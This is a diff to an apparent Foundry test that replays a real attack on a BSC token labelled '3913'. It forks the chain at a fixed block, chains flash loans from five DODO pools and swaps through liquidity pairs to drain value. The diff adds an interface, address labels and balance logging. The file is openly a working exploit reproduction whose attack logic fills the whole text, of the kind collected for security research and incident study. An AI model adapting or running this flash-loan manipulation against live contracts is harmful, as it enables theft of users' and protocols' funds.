@@ -18,7 +18,9 @@ import "./interface.sol";
 
 // The hacker sent multiple transactions to attack, just taking the first transaction as an example.
 
-
+interface IDodo{
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+}
 interface I3913 is IERC20{
     function burnPairs()external;
 }
@@ -42,34 +44,35 @@ contract Exploit is Test {
     uint dodo5FlashLoanAmount;
     function setUp() public {
         cheats.createSelectFork("bsc",33132467);
-
+        cheats.label(address(vulnerable),"3913");
+        cheats.label(address(pair),"pair");
+        cheats.label(address(token9419),"9419");
     }
 
     function testExploit() public {
-        deal(address(this), 0);
+        deal(address(busd),address(this), 0);
+        emit log_named_decimal_uint("attacker balance busd before attack:", busd.balanceOf(address(this)), busd.decimals());
         dodo1FlashLoanAmount = busd.balanceOf(dodo1);
-        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount,address(this),new bytes(1));
-
+        IDodo(dodo1).flashLoan(0, dodo1FlashLoanAmount,address(this),new bytes(1));
         emit log_named_decimal_uint("attacker balance busd after attack:", busd.balanceOf(address(this)), busd.decimals());
-        emit log_named_decimal_uint("attacker balance 3913 after attack:", vulnerable.balanceOf(address(this)), vulnerable.decimals());
 
     }
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         if (msg.sender == dodo1) {
             dodo2FlashLoanAmount = busd.balanceOf(dodo2);
-            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
+            IDodo(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
             busd.transfer(dodo1, dodo1FlashLoanAmount);
         } else if (msg.sender == dodo2) {
             dodo3FlashLoanAmount = busd.balanceOf(dodo3);
-            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
+            IDodo(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
             busd.transfer(dodo2, dodo2FlashLoanAmount);
         } else if (msg.sender == dodo3) {
             dodo4FlashLoanAmount = busd.balanceOf(dodo4);
-            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
+            IDodo(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
             busd.transfer(dodo3, dodo3FlashLoanAmount);
         } else if (msg.sender == dodo4) {
             dodo5FlashLoanAmount = busd.balanceOf(dodo5);
-            DVM(dodo5).flashLoan(0, dodo5FlashLoanAmount, address(this), new bytes(1));
+            IDodo(dodo5).flashLoan(0, dodo5FlashLoanAmount, address(this), new bytes(1));
             busd.transfer(dodo4, dodo4FlashLoanAmount);
         }
         else if (msg.sender == dodo5) {
@@ -126,7 +129,6 @@ contract Exploit is Test {
             pair.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));
             path[0] = address(vulnerable);
             path[1] = address(token9419);
-            emit log_named_decimal_uint("attacker balance 3913:", vulnerable.balanceOf(address(this)), vulnerable.decimals());
             amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)), path);
             token9419.transfer(address(pair3913to9419), 1);
             vulnerable.transfer(address(pair3913to9419), vulnerable.balanceOf(address(this)));
